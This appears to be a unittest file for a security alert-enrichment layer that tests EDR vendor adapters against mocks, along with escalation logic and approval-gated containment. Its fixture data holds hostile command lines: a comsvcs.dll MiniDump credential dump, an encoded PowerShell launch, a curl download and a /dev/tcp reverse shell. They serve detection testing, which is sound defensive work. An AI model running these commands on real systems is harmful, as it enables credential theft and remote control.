"""
Tests for the integration layer. Run: python -m unittest discover -s tests -v

Vendor clients are exercised two ways:
  * SDK-based adapters (CrowdStrike/FalconPy, Carbon Black/CBC SDK) get fake
    service objects with the same method names the real SDKs expose.
  * REST adapters (SentinelOne, Defender/Graph, Wiz GraphQL) run against a
    local mock HTTP server that returns the documented response shapes.
"""

import json
import os
import threading
import unittest
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

os.environ["NO_PROXY"] = os.environ["no_proxy"] = "127.0.0.1,localhost"

from fabric import coverage, field_budget, fidelity, pivot  # noqa: E402
from fabric.common import ThinAlert, Evidence, ProcessNode, ResponseActionBlocked  # noqa: E402
from fabric.context import Context  # noqa: E402
from fabric.edr.base import MockEDR  # noqa: E402
from fabric.edr.crowdstrike import CrowdStrikeAdapter  # noqa: E402
from fabric.edr.carbonblack import CarbonBlackAdapter  # noqa: E402
from fabric.edr.sentinelone import SentinelOneAdapter  # noqa: E402
from fabric.edr.defender import DefenderAdapter  # noqa: E402
from fabric.tip import CsvTIP  # noqa: E402
from fabric.wiz import WizClient, detection_to_alert  # noqa: E402

ROOT = Path(__file__).resolve().parent.parent
M = ROOT / "mocks"


def alerts():
    return {a["alert_id"]: ThinAlert(**a) for a in json.loads((M / "thin_alerts.json").read_text())}


class TestFidelityScenarios(unittest.TestCase):
    """Same thin alert name, three different truths."""

    def run_one(self, aid):
        a = alerts()[aid]
        return pivot.run(a, MockEDR(a.vendor, M / "scenarios.json"), CsvTIP(M / "tip_lookup.csv"),
                         Context(M / "context"))

    def test_attack_escalates(self):
        ev, v = self.run_one("ALERT-ATTACK-001")
        self.assertEqual(v.decision, "escalate")
        self.assertTrue(any(s.name == "tip_match" and s.hard for s in v.signals))

    def test_admin_in_change_window_suppressed(self):
        _, v = self.run_one("ALERT-ADMIN-002")
        self.assertEqual(v.decision, "suppress")
        self.assertTrue(any("CHG0049812" in m for m in v.modifiers))

    def test_grey_goes_to_review(self):
        _, v = self.run_one("ALERT-GREY-003")
        self.assertEqual(v.decision, "review")

    def test_hard_signal_beats_admin_context(self):
        ev = Evidence(alert=ThinAlert("x", "mock", "n", "ADM-JMP-02"),
                      tree=[ProcessNode("1", "rundll32.exe",
                                        "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\t\\l.dmp full")],
                      context={"user_privileged": True, "is_admin_host": True, "change_window": "CHG1",
                               "criticality": 4, "asset_known": True})
        self.assertEqual(fidelity.decide(ev).decision, "escalate")


class TestPartialFailureAndGating(unittest.TestCase):
    def test_step_failure_recorded_not_fatal(self):
        class Broken(MockEDR):
            def network_for(self, alert, pids):
                raise ConnectionError("EDR API 503")
        a = alerts()["ALERT-ATTACK-001"]
        ev, v = pivot.run(a, Broken("x", M / "scenarios.json"), CsvTIP(M / "tip_lookup.csv"), Context(M / "context"))
        self.assertTrue(any("network" in e for e in ev.errors))
        self.assertIn(v.decision, ("escalate", "review"))   # still decides on remaining evidence

    def test_contain_requires_approval(self):
        edr = MockEDR("x", M / "scenarios.json")
        with self.assertRaises(ResponseActionBlocked):
            edr.contain("dev-7f21")
        edr2 = MockEDR("x", M / "scenarios.json", allow_response=True)
        with self.assertRaises(ResponseActionBlocked):
            edr2.contain("dev-7f21")                       # enabled but no ticket
        self.assertTrue(edr2.contain("dev-7f21", approval_ref="INC0012345")["mock"])


# ---------------------------------------------------------------- SDK fakes
class FakeFalcon:
    """Mimics FalconPy service-class return shapes (dicts with status_code/body)."""
    def __init__(self):
        self.jobs = {}

    # Alerts
    def get_alerts_v2(self, composite_ids):
        return {"status_code": 200, "body": {"resources": [{
            "device": {"device_id": "aid1", "hostname": "WS1"}, "user_name": "jdoe",
            "sha256": "ab" * 32, "cmdline": "powershell -enc AAAA", "process_id": "200"}]}}

    # Hosts
    def get_device_details(self, ids):
        return {"status_code": 200, "body": {"resources": [{"hostname": "WS1", "os_version": "Windows 11",
                                                              "last_seen": "2026-11-05T00:00:00Z", "tags": []}]}}

    def perform_action(self, action_name, ids):
        return {"status_code": 202, "body": {"resources": [{"id": ids[0]}]}}

    # NGSIEM
    def start_search(self, repository, query_string, arguments, start):
        jid = f"job{len(self.jobs)}"
        self.jobs[jid] = (query_string, arguments)
        return {"status_code": 200, "resources": {"id": jid}}

    def get_search_status(self, repository, id):
        q, args = self.jobs[id]
        ev = []
        if "TargetProcessId=?pid" in q:
            table = {"200": ("powershell.exe", "100", "powershell -enc AAAA"),
                     "100": ("WINWORD.EXE", "50", "winword doc.docm"), "50": ("explorer.exe", None, "explorer")}
            if args["pid"] in table:
                n, p, c = table[args["pid"]]
                ev = [{"TargetProcessId": args["pid"], "ParentProcessId": p, "ImageFileName": f"\\x\\{n}",
                       "CommandLine": c, "SHA256HashData": "cd" * 32}]
        elif "ParentProcessId=?pid" in q:
            ev = [{"TargetProcessId": "300", "ImageFileName": "\\x\\rundll32.exe",
                   "CommandLine": "rundll32 C:\\Users\\a\\AppData\\Local\\Temp\\x.dll,Start"}]
        elif "NetworkConnectIP4" in q:
            ev = [{"RemoteAddressIP4": "203.0.113.45", "RemotePort": "443"}] if args["pid"] == "300" else []
        elif "count(aid" in q:
            ev = [{"hosts": "1"}]
        return {"status_code": 200, "body": {"done": True, "events": ev}}

    def stop_search(self, repository, id):
        return {}


class TestCrowdStrike(unittest.TestCase):
    def test_tree_network_prevalence(self):
        f = FakeFalcon()
        cs = CrowdStrikeAdapter(f, f, f, poll_s=0)
        a = cs.enrich_alert(ThinAlert("cid:1", "crowdstrike", "n", ""))
        self.assertEqual((a.device_id, a.process_id), ("aid1", "200"))
        tree = cs.process_tree(a)
        self.assertEqual([n.name for n in tree], ["explorer.exe", "WINWORD.EXE", "powershell.exe", "rundll32.exe"])
        net = cs.network_for(a, [n.pid for n in tree])
        self.assertEqual(net[0].remote_ip, "203.0.113.45")
        self.assertEqual(cs.hash_prevalence("cd" * 32), 1)
        # query args are passed as CQL ?params, never string-concatenated
        self.assertTrue(all("?" in q for q, _ in f.jobs.values()))


class FakeCBProc:
    def __init__(self, guid, name, parent=None, children=(), dev=1):
        self.process_guid, self.process_name, self.parent_guid = guid, name, parent and parent.process_guid
        self.process_cmdline, self.process_sha256, self.process_username = [f"{name} args"], ["ef" * 32], ["CORP\\u"]
        self.parents = [parent] if parent else []
        self.children, self.device_id = list(children), dev

    def events(self, event_type):
        class E:
            netconn_remote_ipv4, netconn_remote_port, netconn_domain = "198.51.100.9", 443, "x.example"
        return [E()]


class FakeQuery(list):
    def where(self, **kw):
        k, v = next(iter(kw.items()))
        return FakeQuery([p for p in self if getattr(p, k if k != "process_hash" else "process_sha256") in (v, [v])])


class FakeCBC:
    def __init__(self):
        root = FakeCBProc("g0", "explorer.exe")
        mid = FakeCBProc("g1", "winword.exe", root)
        self.target = FakeCBProc("g2", "powershell.exe", mid, children=[FakeCBProc("g3", "rundll32.exe")])
        self.all = [root, mid, self.target]

    def select(self, model, *ident):
        if model.__name__ == "Process":
            return FakeQuery(self.all)
        raise NotImplementedError


class TestCarbonBlack(unittest.TestCase):
    def test_tree_and_network(self):
        cb = CarbonBlackAdapter(FakeCBC())
        a = ThinAlert("a", "carbonblack", "n", "WS", device_id="1", process_id="g2")
        tree = cb.process_tree(a)
        self.assertEqual([n.name for n in tree], ["explorer.exe", "winword.exe", "powershell.exe", "rundll32.exe"])
        self.assertEqual(cb.network_for(a, ["g2"])[0].domain, "x.example")


# ------------------------------------------------------------ mock HTTP server
class Mock(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def _send(self, obj, code=200):
        b = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        self.wfile.write(b)

    def _body(self):
        n = int(self.headers.get("Content-Length") or 0)
        return self.rfile.read(n).decode()

    def do_GET(self):
        if self.path.startswith("/web/api/v2.1/threats"):
            assert self.headers["Authorization"] == "ApiToken t"
            return self._send({"data": [{"threatInfo": {"sha256": "aa" * 32, "storyline": "SL1",
                                                        "processUser": "CORP\\u"},
                                         "agentRealtimeInfo": {"agentId": "ag1", "agentComputerName": "LNX1"}}]})
        if self.path.startswith("/web/api/v2.1/agents"):
            return self._send({"data": [{"computerName": "LNX1", "osName": "Linux", "groupName": "Servers"}]})
        self._send({}, 404)

    def do_POST(self):
        body = self._body()
        if self.path == "/api/powerQuery":
            assert self.headers["Authorization"] == "Bearer k"
            q = json.loads(body)["query"]
            assert "'SL1'" in q or "estimate_distinct" in q
            if "Process Creation" in q:
                return self._send({"columns": [{"name": c} for c in
                                               ["src.process.uid", "src.process.name", "tgt.process.uid",
                                                "tgt.process.name", "tgt.process.cmdline"]],
                                   "values": [["u1", "bash", "u2", "curl", "curl -o /tmp/x http://x"]]})
            if "estimate_distinct" in q:
                return self._send({"columns": [{"name": "hosts"}], "values": [[3]]})
            return self._send({"columns": [{"name": "src.process.uid"}, {"name": "dst.ip.address"}],
                               "values": [["u2", "203.0.113.45"]]})
        if self.path.endswith("/oauth2/v2.0/token") or self.path == "/oauth/token":
            assert "client_credentials" in body
            return self._send({"access_token": "tok", "expires_in": 3600})
        if self.path == "/v1.0/security/runHuntingQuery":
            assert self.headers["Authorization"] == "Bearer tok"
            q = json.loads(body)["Query"]
            if "summarize hosts" in q:
                return self._send({"schema": [], "results": [{"hosts": 42}]})
            if "DeviceInfo" in q:
                return self._send({"results": [{"DeviceName": "WS9", "OSPlatform": "Windows11"}]})
            return self._send({"results": []})
        if self.path == "/graphql":
            assert self.headers["Authorization"] == "Bearer tok"
            v = json.loads(body)["variables"]
            page = {"nodes": [{"id": f"det{v.get('after') or 0}", "severity": "HIGH",
                               "ruleMatch": {"ruleName": "Reverse shell"},
                               "resources": [{"id": "r1", "name": "k8s-node-1"}],
                               "triggeringEvent": {"process": {"commandLine": "bash -i >& /dev/tcp/x/4444"}},
                               "mitreTactics": ["TA0011"]}],
                    "pageInfo": {"hasNextPage": v.get("after") is None, "endCursor": "1"}}
            return self._send({"data": {"detections": page}})
        self._send({}, 404)


class TestRestAdapters(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.srv = HTTPServer(("127.0.0.1", 0), Mock)
        cls.base = f"http://127.0.0.1:{cls.srv.server_address[1]}"
        threading.Thread(target=cls.srv.serve_forever, daemon=True).start()

    @classmethod
    def tearDownClass(cls):
        cls.srv.shutdown()

    def test_sentinelone_storyline_pivot(self):
        s1 = SentinelOneAdapter(self.base, "t", self.base, "k")
        a = s1.enrich_alert(ThinAlert("th1", "sentinelone", "n", ""))
        self.assertEqual((a.process_id, a.host), ("SL1", "LNX1"))
        self.assertEqual(s1.host_context(a).ou_or_group, "Servers")
        self.assertIn("curl", [n.name for n in s1.process_tree(a)])
        self.assertEqual(s1.network_for(a, [])[0].remote_ip, "203.0.113.45")
        self.assertEqual(s1.hash_prevalence("aa" * 32), 3)

    def test_defender_graph_hunting(self):
        d = DefenderAdapter("tenant", "cid", "sec", graph=f"{self.base}/v1.0",
                            token_url=f"{self.base}/tenant/oauth2/v2.0/token")
        self.assertEqual(d.hash_prevalence("bb" * 32), 42)
        self.assertEqual(d.host_context(ThinAlert("x", "defender", "n", "", device_id="d1")).hostname, "WS9")

    def test_wiz_oauth_graphql_pagination(self):
        w = WizClient("id", "sec", f"{self.base}", auth_url=f"{self.base}/oauth/token")
        dets = list(w.sensor_detections("2026-11-05T00:00:00Z"))
        self.assertEqual(len(dets), 2)                    # two pages followed
        a = detection_to_alert(dets[0])
        self.assertEqual((a.vendor, a.host, a.severity), ("wiz", "k8s-node-1", 8))


class TestBudgetAndCoverage(unittest.TestCase):
    def test_field_budget(self):
        r = field_budget.analyze(M / "field_budget_sample.jsonl", M / "field_budget_detections", 10 ** 9)
        cls = {f["field"]: f["class"] for f in r["fields"]}
        self.assertEqual(cls["CommandLine"], "INDEX")       # used by detection
        self.assertEqual(cls["aid"], "INDEX")               # pivot key
        self.assertEqual(cls["MD5HashData"], "PIVOT")       # unused, fetch on demand
        self.assertEqual(cls["TreeId"], "PIVOT")
        self.assertGreater(r["reduction_pct"], 30)

    def test_coverage_classes(self):
        from datetime import datetime, timezone
        r = coverage.reconcile(M / "coverage", now=datetime(2026, 11, 5, 15, tzinfo=timezone.utc))
        cls = {x["hostname"]: x["class"] for x in r["rows"]}
        self.assertEqual(cls["lnx-db-ora02"], "BLIND")
        self.assertEqual(cls["lnx-k8s-node-00"], "SENSOR_ONLY")
        self.assertEqual(cls["lnx-rhel6-batch01"], "LOGS_ONLY")
        self.assertEqual(cls["ws-0040"], "EDR_STALE")
        self.assertEqual(cls["dev-laptop-x9"], "UNMANAGED")


class TestSensorContent(unittest.TestCase):
    def test_sysmon_builds_and_tags(self):
        import importlib.util
        spec = importlib.util.spec_from_file_location("b", ROOT / "sensors/sysmon/build_sysmon.py")
        b = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(b)
        xml, cov = b.build("4.90", "SHA256")
        self.assertIn("T1003.001", cov)
        self.assertIn("T1219", cov)


if __name__ == "__main__":
    unittest.main()
